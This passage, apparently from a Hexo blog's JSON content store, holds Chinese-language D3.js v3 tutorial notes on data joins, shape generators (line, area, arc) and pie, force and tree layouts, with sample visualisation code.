<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .container text &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">font-size</span>: <span class=\"number\">30px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            fill: <span class=\"number\">#090</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">500</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> padding = &#123;</span></span><br><span class=\"line\">            top: 20,</span><br><span class=\"line\">            right: 20,</span><br><span class=\"line\">            bottom: 30,</span><br><span class=\"line\">            left: 40</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> dataSet = <span class=\"string\">&#x27;abcdefghijklmn&#x27;</span>.split(<span class=\"string\">&#x27;&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> container = svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;padding.left&#125;</span>, <span class=\"subst\">$&#123;padding.top&#125;</span>)`</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w - padding.left - padding.right)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h - padding.top - padding.bottom);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span>(<span class=\"params\">dataSet</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> texts = container.selectAll(<span class=\"string\">&#x27;text&#x27;</span>).data(dataSet<span class=\"comment\">/* , (d) =&gt; d */</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"built_in\">console</span>.log(dataSet);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// update 部分</span></span></span><br><span class=\"line\"><span class=\"javascript\">            texts.attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> i * <span class=\"number\">30</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">120</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"string\">&#x27;#f00&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .text(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123; <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;update ----&gt; &#x27;</span> + data); <span class=\"keyword\">return</span> data; &#125;);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// enter 部分</span></span></span><br><span class=\"line\">            texts.enter()</span><br><span class=\"line\"><span class=\"javascript\">                .append(<span class=\"string\">&#x27;text&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> i * <span class=\"number\">30</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">120</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"string\">&#x27;#0f0&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .text(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123; <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;enter ----&gt; &#x27;</span> + data); <span class=\"keyword\">return</span> data; &#125;);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// exit 部分</span></span></span><br><span class=\"line\">            texts.exit()</span><br><span class=\"line\">                .transition()</span><br><span class=\"line\">                .duration(200)</span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;opacity&#x27;</span>, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123; <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;exit ----&gt; &#x27;</span> + data); <span class=\"keyword\">return</span> <span class=\"number\">0</span>; &#125;)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">&#x27;scale(0)&#x27;</span>)</span></span><br><span class=\"line\">                .remove();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"built_in\">window</span>.setInterval(<span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> data = [<span class=\"string\">&#x27;A&#x27;</span>, <span class=\"string\">&#x27;B&#x27;</span>, ...d3.shuffle(dataSet).slice(<span class=\"number\">0</span>, <span class=\"built_in\">Math</span>.ceil(<span class=\"built_in\">Math</span>.random() * <span class=\"number\">10</span>))];</span></span><br><span class=\"line\">            update(data);</span><br><span class=\"line\">        &#125;, 1000);</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>"},{"title":"形状","date":"2021-03-23T16:00:00.000Z","_content":"\n# 形状\n\n### 线条生成器 `d3.svg.line`\n\n* line.x()\n* line.y()\n* line.interpolate()\n    * linear：分段的线性片段，如折线。\n    * step：水平和垂直片段之间交替，如台阶函数。\n    * step-before：垂直和水平片段之间交替，如台阶函数。\n    * step-after： 水平和垂直片段之间交替，如台阶函数。\n    * basis：一个B-spline，在末尾控制点的重复。\n    * basis-open：一个开放的B-spline；首尾不相交。\n    * cardinal：一个Cardinal spline，在末尾控制点的重复。\n    * cardinal-open：一个开放的Cardinal spline；首尾不相交，但是会和其他控制点相交。\n    * monotone：立方插值(cubic interpolation)保存y值得单调性。\n* line.tension()\n\n### 区域生成器 `d3.svg.area`\n\n* area.x()\n* area.y0()\n* area.y1()\n* area.interpolate()\n* area.tensioin()\n\n### 圆弧生成器 `d3.svg.arc`\n\n* arc() 生成一个像饼图或圆环图中的固定弧度\n* arc.centroid(args) 计算弧中心，返回值为一个数组\n* arc.innerRadius() 获取或设置内半径访问器\n* arc.outerRadius() 获取或设置外半径访问器\n* arc.cornerRadius() 获取或设置拐角（corner）半径访问器\n* arc.startAngle() 获取或设置开始角度访问器\n* arc.endAngle() 获取或设置结束角度访问器\n* arc.padAngle() 获取或设置填补（pad）角度访问器\n* arc.padRadius() 获取或设置填补（pad）半径访问器\n\n\n```js\nlet w = 600;\nlet h = 400;\n\nlet svg = d3.select('body')\n    .append('svg')\n    .attr('width', w)\n    .attr('height', h);\n\nlet endAngle = 2 * Math.PI;\n\nlet data = [{ startAngle: 0, endAngle: 0.1 * endAngle },\n    { startAngle: 0.1 * endAngle, endAngle: 0.2 * endAngle },\n    { startAngle: 0.2 * endAngle, endAngle: 0.4 * endAngle },\n    { startAngle: 0.4 * endAngle, endAngle: 0.6 * endAngle },\n    { startAngle: 0.6 * endAngle, endAngle: 0.7 * endAngle },\n    { startAngle: 0.7 * endAngle, endAngle: 0.9 * endAngle },\n    { startAngle: 0.9 * endAngle, endAngle: endAngle }];\n\nlet arc = d3.svg.arc()\n    .innerRadius(100)\n    .outerRadius(150);\n\nlet color = d3.scale.category10();\n\nsvg.append('g')\n    .attr('class', 'arc')\n    .attr('transform', 'translate(250, 250)')\n.selectAll('path')\n    .data(data)\n    .enter()\n    .append('path')\n    .style('fill', (d, i) => color(i))\n    .transition()\n    .duration(1200)\n    .attrTween('d', (d) => {\n        let start = {\n            startAngle: 0,\n            endAngle: 0\n        };\n\n        let interpolate = d3.interpolate(start, d);\n\n        return (t) => arc(interpolate(t));\n    });\n```","source":"_posts/D3.js/形状.md","raw":"---\ntitle: 形状\ncategories: [D3.js]\ntags: [D3.js]\ndate: 2021-03-24\n---\n\n# 形状\n\n### 线条生成器 `d3.svg.line`\n\n* line.x()\n* line.y()\n* line.interpolate()\n    * linear：分段的线性片段，如折线。\n    * step：水平和垂直片段之间交替，如台阶函数。\n    * step-before：垂直和水平片段之间交替，如台阶函数。\n    * step-after： 水平和垂直片段之间交替，如台阶函数。\n    * basis：一个B-spline，在末尾控制点的重复。\n    * basis-open：一个开放的B-spline；首尾不相交。\n    * cardinal：一个Cardinal spline，在末尾控制点的重复。\n    * cardinal-open：一个开放的Cardinal spline；首尾不相交，但是会和其他控制点相交。\n    * monotone：立方插值(cubic interpolation)保存y值得单调性。\n* line.tension()\n\n### 区域生成器 `d3.svg.area`\n\n* area.x()\n* area.y0()\n* area.y1()\n* area.interpolate()\n* area.tensioin()\n\n### 圆弧生成器 `d3.svg.arc`\n\n* arc() 生成一个像饼图或圆环图中的固定弧度\n* arc.centroid(args) 计算弧中心，返回值为一个数组\n* arc.innerRadius() 获取或设置内半径访问器\n* arc.outerRadius() 获取或设置外半径访问器\n* arc.cornerRadius() 获取或设置拐角（corner）半径访问器\n* arc.startAngle() 获取或设置开始角度访问器\n* arc.endAngle() 获取或设置结束角度访问器\n* arc.padAngle() 获取或设置填补（pad）角度访问器\n* arc.padRadius() 获取或设置填补（pad）半径访问器\n\n\n```js\nlet w = 600;\nlet h = 400;\n\nlet svg = d3.select('body')\n    .append('svg')\n    .attr('width', w)\n    .attr('height', h);\n\nlet endAngle = 2 * Math.PI;\n\nlet data = [{ startAngle: 0, endAngle: 0.1 * endAngle },\n    { startAngle: 0.1 * endAngle, endAngle: 0.2 * endAngle },\n    { startAngle: 0.2 * endAngle, endAngle: 0.4 * endAngle },\n    { startAngle: 0.4 * endAngle, endAngle: 0.6 * endAngle },\n    { startAngle: 0.6 * endAngle, endAngle: 0.7 * endAngle },\n    { startAngle: 0.7 * endAngle, endAngle: 0.9 * endAngle },\n    { startAngle: 0.9 * endAngle, endAngle: endAngle }];\n\nlet arc = d3.svg.arc()\n    .innerRadius(100)\n    .outerRadius(150);\n\nlet color = d3.scale.category10();\n\nsvg.append('g')\n    .attr('class', 'arc')\n    .attr('transform', 'translate(250, 250)')\n.selectAll('path')\n    .data(data)\n    .enter()\n    .append('path')\n    .style('fill', (d, i) => color(i))\n    .transition()\n    .duration(1200)\n    .attrTween('d', (d) => {\n        let start = {\n            startAngle: 0,\n            endAngle: 0\n        };\n\n        let interpolate = d3.interpolate(start, d);\n\n        return (t) => arc(interpolate(t));\n    });\n```","slug":"D3.js/形状","published":1,"updated":"2021-04-28T02:31:17.703Z","_id":"cko0u126q0004y26rhwaw5mkh","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"形状\"><a href=\"#形状\" class=\"headerlink\" title=\"形状\"></a>形状</h1><h3 id=\"线条生成器-d3-svg-line\"><a href=\"#线条生成器-d3-svg-line\" class=\"headerlink\" title=\"线条生成器 d3.svg.line\"></a>线条生成器 <code>d3.svg.line</code></h3><ul>\n<li>line.x()</li>\n<li>line.y()</li>\n<li>line.interpolate()<ul>\n<li>linear：分段的线性片段，如折线。</li>\n<li>step：水平和垂直片段之间交替，如台阶函数。</li>\n<li>step-before：垂直和水平片段之间交替，如台阶函数。</li>\n<li>step-after： 水平和垂直片段之间交替，如台阶函数。</li>\n<li>basis：一个B-spline，在末尾控制点的重复。</li>\n<li>basis-open：一个开放的B-spline；首尾不相交。</li>\n<li>cardinal：一个Cardinal spline，在末尾控制点的重复。</li>\n<li>cardinal-open：一个开放的Cardinal spline；首尾不相交，但是会和其他控制点相交。</li>\n<li>monotone：立方插值(cubic interpolation)保存y值得单调性。</li>\n</ul>\n</li>\n<li>line.tension()</li>\n</ul>\n<h3 id=\"区域生成器-d3-svg-area\"><a href=\"#区域生成器-d3-svg-area\" class=\"headerlink\" title=\"区域生成器 d3.svg.area\"></a>区域生成器 <code>d3.svg.area</code></h3><ul>\n<li>area.x()</li>\n<li>area.y0()</li>\n<li>area.y1()</li>\n<li>area.interpolate()</li>\n<li>area.tensioin()</li>\n</ul>\n<h3 id=\"圆弧生成器-d3-svg-arc\"><a href=\"#圆弧生成器-d3-svg-arc\" class=\"headerlink\" title=\"圆弧生成器 d3.svg.arc\"></a>圆弧生成器 <code>d3.svg.arc</code></h3><ul>\n<li>arc() 生成一个像饼图或圆环图中的固定弧度</li>\n<li>arc.centroid(args) 计算弧中心，返回值为一个数组</li>\n<li>arc.innerRadius() 获取或设置内半径访问器</li>\n<li>arc.outerRadius() 获取或设置外半径访问器</li>\n<li>arc.cornerRadius() 获取或设置拐角（corner）半径访问器</li>\n<li>arc.startAngle() 获取或设置开始角度访问器</li>\n<li>arc.endAngle() 获取或设置结束角度访问器</li>\n<li>arc.padAngle() 获取或设置填补（pad）角度访问器</li>\n<li>arc.padRadius() 获取或设置填补（pad）半径访问器</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> w = <span class=\"number\">600</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span><br><span class=\"line\">    .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> endAngle = <span class=\"number\">2</span> * <span class=\"built_in\">Math</span>.PI;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> data = [&#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0</span>, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.1</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.1</span> * endAngle, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.2</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.2</span> * endAngle, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.4</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.4</span> * endAngle, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.6</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.6</span> * endAngle, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.7</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.7</span> * endAngle, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.9</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.9</span> * endAngle, <span class=\"attr\">endAngle</span>: endAngle &#125;];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> arc = d3.svg.arc()</span><br><span class=\"line\">    .innerRadius(<span class=\"number\">100</span>)</span><br><span class=\"line\">    .outerRadius(<span class=\"number\">150</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> color = d3.scale.category10();</span><br><span class=\"line\"></span><br><span class=\"line\">svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;arc&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">&#x27;translate(250, 250)&#x27;</span>)</span><br><span class=\"line\">.selectAll(<span class=\"string\">&#x27;path&#x27;</span>)</span><br><span class=\"line\">    .data(data)</span><br><span class=\"line\">    .enter()</span><br><span class=\"line\">    .append(<span class=\"string\">&#x27;path&#x27;</span>)</span><br><span class=\"line\">    .style(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"function\">(<span class=\"params\">d, i</span>) =&gt;</span> color(i))</span><br><span class=\"line\">    .transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">1200</span>)</span><br><span class=\"line\">    .attrTween(<span class=\"string\">&#x27;d&#x27;</span>, <span class=\"function\">(<span class=\"params\">d</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> start = &#123;</span><br><span class=\"line\">            startAngle: <span class=\"number\">0</span>,</span><br><span class=\"line\">            endAngle: <span class=\"number\">0</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">let</span> interpolate = d3.interpolate(start, d);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"function\">(<span class=\"params\">t</span>) =&gt;</span> arc(interpolate(t));</span><br><span class=\"line\">    &#125;);</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"形状\"><a href=\"#形状\" class=\"headerlink\" title=\"形状\"></a>形状</h1><h3 id=\"线条生成器-d3-svg-line\"><a href=\"#线条生成器-d3-svg-line\" class=\"headerlink\" title=\"线条生成器 d3.svg.line\"></a>线条生成器 <code>d3.svg.line</code></h3><ul>\n<li>line.x()</li>\n<li>line.y()</li>\n<li>line.interpolate()<ul>\n<li>linear：分段的线性片段，如折线。</li>\n<li>step：水平和垂直片段之间交替，如台阶函数。</li>\n<li>step-before：垂直和水平片段之间交替，如台阶函数。</li>\n<li>step-after： 水平和垂直片段之间交替，如台阶函数。</li>\n<li>basis：一个B-spline，在末尾控制点的重复。</li>\n<li>basis-open：一个开放的B-spline；首尾不相交。</li>\n<li>cardinal：一个Cardinal spline，在末尾控制点的重复。</li>\n<li>cardinal-open：一个开放的Cardinal spline；首尾不相交，但是会和其他控制点相交。</li>\n<li>monotone：立方插值(cubic interpolation)保存y值得单调性。</li>\n</ul>\n</li>\n<li>line.tension()</li>\n</ul>\n<h3 id=\"区域生成器-d3-svg-area\"><a href=\"#区域生成器-d3-svg-area\" class=\"headerlink\" title=\"区域生成器 d3.svg.area\"></a>区域生成器 <code>d3.svg.area</code></h3><ul>\n<li>area.x()</li>\n<li>area.y0()</li>\n<li>area.y1()</li>\n<li>area.interpolate()</li>\n<li>area.tensioin()</li>\n</ul>\n<h3 id=\"圆弧生成器-d3-svg-arc\"><a href=\"#圆弧生成器-d3-svg-arc\" class=\"headerlink\" title=\"圆弧生成器 d3.svg.arc\"></a>圆弧生成器 <code>d3.svg.arc</code></h3><ul>\n<li>arc() 生成一个像饼图或圆环图中的固定弧度</li>\n<li>arc.centroid(args) 计算弧中心，返回值为一个数组</li>\n<li>arc.innerRadius() 获取或设置内半径访问器</li>\n<li>arc.outerRadius() 获取或设置外半径访问器</li>\n<li>arc.cornerRadius() 获取或设置拐角（corner）半径访问器</li>\n<li>arc.startAngle() 获取或设置开始角度访问器</li>\n<li>arc.endAngle() 获取或设置结束角度访问器</li>\n<li>arc.padAngle() 获取或设置填补（pad）角度访问器</li>\n<li>arc.padRadius() 获取或设置填补（pad）半径访问器</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> w = <span class=\"number\">600</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span><br><span class=\"line\">    .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> endAngle = <span class=\"number\">2</span> * <span class=\"built_in\">Math</span>.PI;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> data = [&#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0</span>, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.1</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.1</span> * endAngle, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.2</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.2</span> * endAngle, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.4</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.4</span> * endAngle, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.6</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.6</span> * endAngle, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.7</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.7</span> * endAngle, <span class=\"attr\">endAngle</span>: <span class=\"number\">0.9</span> * endAngle &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">startAngle</span>: <span class=\"number\">0.9</span> * endAngle, <span class=\"attr\">endAngle</span>: endAngle &#125;];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> arc = d3.svg.arc()</span><br><span class=\"line\">    .innerRadius(<span class=\"number\">100</span>)</span><br><span class=\"line\">    .outerRadius(<span class=\"number\">150</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> color = d3.scale.category10();</span><br><span class=\"line\"></span><br><span class=\"line\">svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;arc&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">&#x27;translate(250, 250)&#x27;</span>)</span><br><span class=\"line\">.selectAll(<span class=\"string\">&#x27;path&#x27;</span>)</span><br><span class=\"line\">    .data(data)</span><br><span class=\"line\">    .enter()</span><br><span class=\"line\">    .append(<span class=\"string\">&#x27;path&#x27;</span>)</span><br><span class=\"line\">    .style(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"function\">(<span class=\"params\">d, i</span>) =&gt;</span> color(i))</span><br><span class=\"line\">    .transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">1200</span>)</span><br><span class=\"line\">    .attrTween(<span class=\"string\">&#x27;d&#x27;</span>, <span class=\"function\">(<span class=\"params\">d</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> start = &#123;</span><br><span class=\"line\">            startAngle: <span class=\"number\">0</span>,</span><br><span class=\"line\">            endAngle: <span class=\"number\">0</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">let</span> interpolate = d3.interpolate(start, d);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"function\">(<span class=\"params\">t</span>) =&gt;</span> arc(interpolate(t));</span><br><span class=\"line\">    &#125;);</span><br></pre></td></tr></table></figure>"},{"title":"布局","date":"2021-03-23T16:00:00.000Z","_content":"\n# 布局\n\n### 1、饼布局 `d3.layout.pie`\n\n* pie.endAngl 取得或设置饼布局整体的结束角度\n* pie.padAngle 取得或设置饼布局填充角度\n* pie.sort 控制饼片段的顺时针方向的顺序\n* pie.startAngle 取得或设置饼布局整体的开始角度\n* pie.value 取得或设置值访问器函数\n* pie 计算饼图或圆环图中弧的开始和结束角度\n\n### 力布局 `d3.layout.force`\n* force.links() 取得或者设置节点间的链接数组\n* force.nodes() 取得或者设置布局的节点数组\n* force.size() 取得或者设置布局大小\n* force.linkDistance() 取得或者设置链接距离\n* force.charge() 取得或者设置电荷强度\n* force.on() 监听在计算布局位置时的更新\n    * start 力学图运动开始\n    * tick 力学图运动中\n    * end 力学图运动结束\n* force.drag() 给节点绑定拖动行为\n    * dragstart 单个节点拖拽开始\n    * drag 单个节点拖拽中\n    * dragend 单个节点拖拽结束\n* force.alpha() 取得或者设置力布局的冷却参数\n\n### 树布局 `d3.layout.tree`\n* `tree()` tree.nodes的别名\n* `tree.children()` 取得或设置孩子访问器\n* `tree.size()` 用x和y指定树的尺寸\n* `tree.nodes()` 计算父布局并返回一组节点\n* `tree.links()` 计算树节点的父-子连接\n* `tree.sort()` 控制遍历顺序中兄弟节点的顺序\n* `tree.nodeSize()` 为每个节点指定一个固定的尺寸\n* `tree.separation()` 取得或设置相邻节点的间隔函数\n","source":"_posts/D3.js/布局.md","raw":"---\ntitle: 布局\ncategories: [D3.js]\ntags: [D3.js]\ndate: 2021-03-24\n---\n\n# 布局\n\n### 1、饼布局 `d3.layout.pie`\n\n* pie.endAngl 取得或设置饼布局整体的结束角度\n* pie.padAngle 